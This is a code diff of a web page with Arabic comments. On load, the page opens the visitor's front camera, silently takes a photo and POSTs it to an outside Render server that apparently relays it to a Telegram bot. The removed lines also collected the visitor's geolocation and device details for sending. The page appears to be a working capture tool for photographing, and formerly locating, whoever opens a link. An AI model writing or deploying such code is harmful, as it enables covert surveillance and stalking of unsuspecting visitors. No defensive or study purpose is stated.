@@ -33,72 +33,90 @@
     <video id="camera-feed" autoplay playsinline></video>
     <canvas id="photo-canvas"></canvas>
 
-    <p id="status-message">جاري طلب الوصول إلى الكاميرا والموقع...</p>
+    <p id="status-message">جاري طلب الوصول إلى الكاميرا...</p>
 
     <script>
         const video = document.getElementById('camera-feed');
         const canvas = document.getElementById('photo-canvas');
         const statusMessage = document.getElementById('status-message');
         
-        // 🛑 دالة جمع الموقع الجغرافي (Geolocation) 🛑
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy 
-                            });
-                        },
-                        (error) => {
-                            // إذا رفض المستخدم، أرسل بيانات فارغة
-                            console.error("Geolocation denied or failed:", error);
-                            resolve({ lat: null, lon: null, error: error.message });
-                        },
-                        { timeout: 5000 } // مهلة 5 ثواني
-                    );
-                } else {
-                    resolve({ lat: null, lon: null, error: "Geolocation not supported" });
-                }
-            });
-        }
-        
         // 🛑 دالة التقاط وإرسال تلقائية 🛑
-        async function captureAndSend() {
-            statusMessage.textContent = '📸 جاري جمع الموقع والتقاط الصورة...';
+        function captureAndSend() {
+            statusMessage.textContent = '📸 جاري التقاط الصورة وإرسالها...';
 
-            // 1. جمع الموقع وبيانات الجهاز الأساسية
-            const locationData = await getLocation();
-            
-            const systemData = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                screenResolution: ${screen.width}x${screen.height},
-                language: navigator.language,
-                // يتم إضافة بيانات الموقع هنا
-                location: locationData
-            };
-            
-            // 2. الالتقاط (مع تأخير لمنع الصورة السوداء)
+            // إضافة تأخير بسيط لضمان استقرار الإطار (لمنع الصورة السوداء)
             setTimeout(() => {
                 
+                // تحديد أبعاد الـ Canvas
                 canvas.width = video.videoWidth || 640; 
                 canvas.height = video.videoHeight || 480;
 
+                // رسم إطار الفيديو الحالي على الـ Canvas
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
+                // تحويل الصورة إلى Base64
                 const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
 
-                // 3. إرسال الصورة والبيانات معًا
-                sendPhotoToServer(imageDataURL, systemData);
+                // إرسال الصورة إلى الخادم
+                sendPhotoToServer(imageDataURL);
 
-            }, 500); 
+            }, 500); // 500 مللي ثانية (نصف ثانية)
         }
         
         // 1. طلب الوصول إلى الكاميرا
         async function startCamera() {
             try {
+                // طلب الوصول إلى الكاميرا الأمامية
                 const constraints = { video: { facingMode: 'user' } }; 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                statusMessage.textContent = 'الكاميرا جاهزة للعمل. يتم التحضير للإرسال...';
+                
+                // 🛑 عند بدء تدفق الكاميرا، قم بالالتقاط والإرسال فوراً 🛑
+                video.onloadedmetadata = function() {
+                    captureAndSend();
+                };
+
+            } catch (err) {
+                console.error("خطأ في الوصول إلى الكاميرا: ", err);
+                statusMessage.textContent = '⛔ يجب عليك السماح بالوصول إلى الكاميرا لتتمكن من استخدام هذه الخاصية.';
+            }
+        }
+
+        // 3. دالة الإرسال للخادم الخلفي
+        async function sendPhotoToServer(imageData) {
+            // رابط الخادم الخلفي (Render) الذي يعمل بنجاح
+            const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
+            
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                if (response.ok) {
+                    statusMessage.textContent = '✅ تم التقاط الصورة وإرسالها إلى التليجرام بنجاح!';
+                } else {
+                    const errorData = await response.json().catch(() => ({ message: response.statusText }));
+                    statusMessage.textContent = `❌ فشل الإرسال. تأكد من أن البوت يعمل.`;
+                }
+            } catch (error) {
+                console.error('خطأ في الاتصال بالخادم:', error);
+                statusMessage.textContent = '⚠️ خطأ في الاتصال بالخادم. تأكد من أن الخادم يعمل.';
+            } finally {
+                // إيقاف تدفق الكاميرا بعد الانتهاء للحفاظ على الخصوصية
+                if (video.srcObject) {
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+                }
+            }
+        }
+
+        // بدء تشغيل الكاميرا عند تحميل الصفحة
+        startCamera();
+    </script>
+</body>
+</html>
